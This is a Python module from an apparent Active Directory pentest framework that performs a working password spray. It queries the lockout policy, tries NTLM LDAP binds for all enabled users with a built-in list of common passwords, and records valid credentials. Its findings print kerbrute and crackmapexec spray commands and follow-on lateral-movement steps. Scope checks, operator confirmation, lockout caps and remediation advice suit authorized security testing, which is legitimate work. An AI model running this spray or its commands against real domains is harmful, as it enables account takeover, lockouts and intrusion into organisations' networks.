"""Password spray — domain-wide spray with full lockout safety engine.

Attack: TA0006/T1110.003
Queries domain lockout policy FIRST via LDAP before any authentication attempts.
Hard stops on ANY lockout indicator. Never exceeds lockoutThreshold - 1 attempts.
"""
from __future__ import annotations

import asyncio
import sys
import time
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

CVSS_SPRAY = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
CVSS40_SPRAY = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
# LDAP result description strings that indicate account lockout
LOCKOUT_INDICATORS = [
    "account is locked",
    "account locked",
    "locked out",
    "too many failed",
    "account has been locked",
    "intruder lockout",
    "temporary lock",
    "account restriction",  # AD LDAP 49 sub-error 533 = account disabled; 775 = locked
]

# LDAP sub-error codes embedded in the diagnostic message
# 775 = ERROR_ACCOUNT_LOCKED_OUT, 533 = ERROR_ACCOUNT_DISABLED
LOCKOUT_DATA_CODE = "775"
DISABLED_DATA_CODE = "533"


class PasswordSpray(BaseModule):
    """Password spray module with comprehensive lockout safety and LDAP policy query."""

    NAME        = "password_spray"
    DESCRIPTION = "Password spray across domain users with lockout protection (queries policy first)"
    PHASE       = 6
    TAGS        = ["spray", "auth", "credential", "mitre-T1110.003"]

    async def run(self) -> ModuleResult:
        start  = time.monotonic()
        domain = self.config.extra.get("domain", "")
        dc_ip  = self.config.extra.get("dc", self.config.target)

        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        # CRITICAL: Query lockout policy FIRST before any auth attempt
        await self.rate_limit()
        policy = await self._get_password_policy(domain, dc_ip)
        threshold   = policy.get("lockout_threshold", 0)
        obs_window  = policy.get("observation_window_minutes", 30)
        min_pwd_len = policy.get("min_pwd_length", 7)

        if threshold > 0:
            # Never attempt more than threshold - 1 per account per observation window
            safe_attempts = max(1, threshold - 1)
            self.log.info(
                "Domain lockout policy: threshold=%d, observation=%dmin — "
                "safe max attempts per account: %d",
                threshold, obs_window, safe_attempts,
            )
        else:
            # threshold == 0 means NO lockout policy — still limit to 1 attempt per round
            # to avoid detection and reduce noise
            safe_attempts = 1
            self.log.info(
                "No lockout policy (threshold=0) — using conservative 1 attempt per account"
            )

        confirmed = self.confirm_action(
            action=(
                f"Password spray against domain {domain} "
                f"(lockout threshold: {threshold}, obs window: {obs_window}min, "
                f"safe attempts/account: {safe_attempts})"
            ),
            target=domain,
            risk=(
                f"Domain lockout threshold = {threshold}. "
                "Spray capped at threshold-1 attempts per account. "
                "STILL creates Event ID 4625/4771 and may trigger SIEM alerts. "
                "Hard stop on any lockout detection."
            ),
        )
        if not confirmed:
            return self._make_result(start, skipped=True, skip_reason="not confirmed by operator")

        users     = self.config.extra.get("domain_users", [])
        passwords = self._load_spray_wordlist()

        if not users:
            self.log.warning("No users in config — run user_enum first to populate domain_users")
            return self._make_result(start)

        # Filter to only enabled users
        if self.config.extra.get("user_objects"):
            UAC_DISABLED = 0x2
            users = [
                u.get("sAMAccountName", "") if isinstance(u, dict) else u
                for u in self.config.extra.get("user_objects", [])
                if not (int(str((u if isinstance(u, dict) else {}).get(
                    "userAccountControl", 0) or 0)) & UAC_DISABLED)
            ]
            users = [u for u in users if u]
        self.log.info(
            "Spraying %d enabled user(s) with %d password(s), max %d round(s)",
            len(users), len(passwords), self.config.brute_force.spray_max_rounds,
        )

        attempt_counts: dict[str, int] = {}
        valid_creds:    list[dict]     = []
        locked_accounts: list[str]    = []
        consecutive_errors = 0

        for round_num in range(self.config.brute_force.spray_max_rounds):
            if round_num > 0:
                self.log.info(
                    "Waiting %.0fs before round %d of %d...",
                    self.config.brute_force.spray_delay_seconds,
                    round_num + 1,
                    self.config.brute_force.spray_max_rounds,
                )
                await asyncio.sleep(self.config.brute_force.spray_delay_seconds)

            if round_num >= len(passwords):
                self.log.info("No more passwords to spray — stopping")
                break
            password = passwords[round_num]

            self.log.info(
                "Round %d/%d — testing password: %s",
                round_num + 1, self.config.brute_force.spray_max_rounds,
                "*" * len(password),
            )

            for username in users:
                # Hard gate: per-account attempt limit
                if attempt_counts.get(username, 0) >= safe_attempts:
                    continue
                if username in locked_accounts:
                    continue

                await self.rate_limit()
                await asyncio.sleep(self.config.brute_force.delay_seconds)

                result = await self._attempt_auth(username, password, domain, dc_ip)
                attempt_counts[username] = attempt_counts.get(username, 0) + 1

                if result == "success":
                    self.log.warning("VALID CREDENTIALS: %s (password redacted)", username)
                    valid_creds.append({"username": username, "password": password})
                    consecutive_errors = 0

                elif result == "locked":
                    self.log.critical(
                        "ACCOUNT LOCKED: %s — HARD STOPPING all spray activity immediately!",
                        username,
                    )
                    locked_accounts.append(username)
                    # Hard stop: any lockout = immediate abort
                    await self._report_spray_results(
                        valid_creds, locked_accounts, attempt_counts, domain, dc_ip
                    )
                    return self._make_result(start)

                elif result == "error":
                    consecutive_errors += 1
                    if consecutive_errors >= 5:
                        # 5+ consecutive errors likely indicate network/DC issue
                        self.log.error(
                            "5 consecutive errors — pausing 30s (DC may be rate-limiting)"
                        )
                        await asyncio.sleep(30)
                        consecutive_errors = 0
                else:
                    consecutive_errors = 0

        await self._report_spray_results(
            valid_creds, locked_accounts, attempt_counts, domain, dc_ip
        )
        return self._make_result(start)

    async def _attempt_auth(
        self, username: str, password: str, domain: str, dc_ip: str
    ) -> str:
        """Attempt LDAP/NTLM authentication. Returns: success | failed | locked | disabled | error."""
        try:
            from ldap3 import Server, Connection, NTLM, ALL
            server = Server(
                dc_ip, get_info=ALL,
                connect_timeout=self.config.brute_force.timeout_seconds,
            )
            upn  = f"{username}@{domain}" if "@" not in username else username
            conn = Connection(
                server, user=upn, password=password, authentication=NTLM,
                raise_exceptions=False,
                receive_timeout=self.config.brute_force.timeout_seconds,
            )
            bind_result = conn.bind()

            if bind_result:
                conn.unbind()
                return "success"

            result_desc  = str(conn.result.get("description", "")).lower()
            result_msg   = str(conn.result.get("message", "")).lower()
            diag_message = str(conn.result.get("diagnosticMessage", "") or "").lower()
            conn.unbind()

            # Check for lockout indicators in all message fields
            full_msg = f"{result_desc} {result_msg} {diag_message}"
            for indicator in LOCKOUT_INDICATORS:
                if indicator in full_msg:
                    return "locked"

            # AD LDAP sub-error codes (embedded in the diagnostic message)
            if LOCKOUT_DATA_CODE in diag_message:
                return "locked"
            if DISABLED_DATA_CODE in diag_message:
                return "disabled"

            return "failed"

        except Exception as exc:
            self.log.debug("Auth attempt exception for %s: %s", username, exc)
            return "error"

    async def _get_password_policy(self, domain: str, dc_ip: str) -> dict[str, Any]:
        """Query domain password policy via LDAP (always called first)."""
        try:
            client = LdapClient(
                dc_ip=dc_ip, domain=domain,
                username=self.config.extra.get("username", ""),
                password=self.config.extra.get("password", ""),
                nt_hash=self.config.extra.get("hash", ""),
            )
            if not client.connect():
                self.log.warning(
                    "Could not query lockout policy (LDAP failed) — defaulting to threshold=0"
                )
                return {"lockout_threshold": 0, "observation_window_minutes": 30, "min_pwd_length": 7}
            try:
                info = client.get_domain_info()
            finally:
                client.disconnect()

            threshold   = int(str(info.get("lockoutThreshold") or 0))
            # lockoutObservationWindow is stored as negative 100-nanosecond intervals
            obs_raw     = info.get("lockoutObservationWindow") or -18000000000
            obs_minutes = abs(int(str(obs_raw))) // 600000000
            min_pwd     = int(str(info.get("minPwdLength") or 0))

            self.log.info(
                "Password policy: lockout_threshold=%d, obs_window=%dmin, min_pwd_len=%d",
                threshold, obs_minutes, min_pwd,
            )
            return {
                "lockout_threshold":        threshold,
                "observation_window_minutes": obs_minutes,
                "min_pwd_length":           min_pwd,
            }
        except Exception as exc:
            self.log.warning("Password policy query failed: %s — assuming threshold=0", exc)
            return {"lockout_threshold": 0, "observation_window_minutes": 30, "min_pwd_length": 7}

    async def _report_spray_results(
        self,
        valid_creds:    list[dict],
        locked_accounts: list[str],
        attempt_counts:  dict[str, int],
        domain:         str,
        dc_ip:          str,
    ) -> None:
        total_attempts = sum(attempt_counts.values())

        if locked_accounts:
            self.new_finding(
                title=f"Account Lockout Triggered During Password Spray "
                      f"({len(locked_accounts)} Account(s))",
                severity=Severity.HIGH,
                description=(
                    f"Password spray caused lockout of {len(locked_accounts)} account(s): "
                    f"{', '.join(locked_accounts[:5])}. "
                    "Spray was immediately halted on first lockout detection."
                ),
                reproduction_steps=[
                    "Spray halted immediately on lockout detection.",
                    f"Locked accounts: {locked_accounts}",
                    f"Total attempts before halt: {total_attempts}",
                ],
                remediation=(
                    "Review AD lockout logs (Event ID 4740 on PDC emulator). "
                    "Reset locked accounts after confirming this was a test. "
                    "Investigate originating IP for real-world attack assessment."
                ),
                references=["MITRE TA0006/T1110.003"],
                evidence=Evidence(extra={"locked": locked_accounts, "total_attempts": total_attempts}),
                cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
                mitre_attack=["TA0006/T1110.003"],
                target=domain,
            )

        if valid_creds:
            ev = Evidence(extra={
                "valid_credentials": [
                    {"username": c["username"], "password": "*" * len(c["password"])}
                    for c in valid_creds
                ],
                "total_attempts": total_attempts,
                "valid_count":    len(valid_creds),
            })
            self.new_finding(
                title=f"Valid Credentials Found via Password Spray ({len(valid_creds)} Account(s))",
                severity=Severity.CRITICAL,
                description=(
                    f"Password spray yielded {len(valid_creds)} valid credential pair(s) "
                    f"across {total_attempts} total attempt(s).\n\n"
                    f"Compromised accounts: "
                    f"{', '.join(c['username'] for c in valid_creds[:10])}\n\n"
                    "Compromised accounts should be considered fully controlled by an attacker. "
                    "These credentials enable further enumeration, lateral movement, and privilege escalation."
                ),
                reproduction_steps=[
                    f"# kerbrute password spray:",
                    f"kerbrute passwordspray --dc {dc_ip} --domain {domain} users.txt <password>",
                    f"# crackmapexec spray:",
                    f"crackmapexec smb {dc_ip} -u users.txt -p <password> --continue-on-success",
                    f"# Valid accounts: {[c['username'] for c in valid_creds]}",
                    "# Next steps: enumerate with compromised creds, check for local admin",
                    f"crackmapexec smb <subnet> -u <user> -p <pass>",
                ],
                remediation=(
                    "1. Reset all identified compromised passwords IMMEDIATELY.\n"
                    "2. Enforce MFA for all domain accounts (Entra ID / RADIUS).\n"
                    "3. Implement account lockout: 3-5 attempts, 30-minute observation window.\n"
                    "4. Enforce password complexity + minimum 12-character length.\n"
                    "5. Block common passwords with Azure AD Password Protection (on-prem).\n"
                    "6. Monitor Event ID 4625 (failed logon) and 4771 (Kerberos pre-auth failure).\n"
                    "7. Deploy Entra ID Smart Lockout or AD FS Extranet Lockout."
                ),
                references=[
                    "MITRE TA0006/T1110.003",
                    "https://attack.mitre.org/techniques/T1110/003/",
                    "CWE-521 — Weak Password Requirements",
                    "NIST SP 800-63B",
                ],
                evidence=ev,
                cvss_v31_vector=CVSS_SPRAY,
                cvss_v40_vector=CVSS40_SPRAY,
                mitre_attack=["TA0006/T1110.003"],
                target=domain,
            )

        # Even if no valid creds, report weak policy findings
        if not valid_creds and not locked_accounts and total_attempts > 0:
            self.log.info(
                "Password spray completed: %d attempts, no valid credentials found",
                total_attempts,
            )

    def _load_spray_wordlist(self) -> list[str]:
        """Load spray password list from data/wordlists/spray_small.txt."""
        wl_path = (
            Path(__file__).parent.parent.parent.parent
            / "adforge" / "data" / "wordlists" / "spray_small.txt"
        )
        if wl_path.exists():
            try:
                return [
                    line.strip()
                    for line in wl_path.read_text().splitlines()
                    if line.strip() and not line.startswith("#")
                ]
            except Exception:
                pass
        # Fallback list: seasonally aware passwords common in enterprise environments
        return [
            "Password1",   "Password1!",  "Password123",
            "Welcome1",    "Welcome1!",   "Welcome123",
            "Summer2024!", "Winter2024!", "Spring2025!", "Autumn2024!",
            "Company1!",   "P@ssw0rd",    "Admin1234!",
            "Letmein1!",   "Qwerty123!",
        ]


class TestPasswordSpray:
    def test_lockout_indicators_not_empty(self) -> None:
        assert len(LOCKOUT_INDICATORS) >= 5
        assert "account is locked" in LOCKOUT_INDICATORS

    def test_lockout_data_codes(self) -> None:
        assert LOCKOUT_DATA_CODE == "775"
        assert DISABLED_DATA_CODE == "533"

    def test_load_wordlist_returns_list(self) -> None:
        mod = PasswordSpray.__new__(PasswordSpray)
        mod.config = type("C", (), {"extra": {}})()
        result = mod._load_spray_wordlist()
        assert isinstance(result, list)
        assert len(result) > 0

    def test_phase(self) -> None:
        assert PasswordSpray.PHASE == 6

    def test_cvss(self) -> None:
        assert CVSS_SPRAY.startswith("CVSS:3.1")
        assert "PR:N" in CVSS_SPRAY
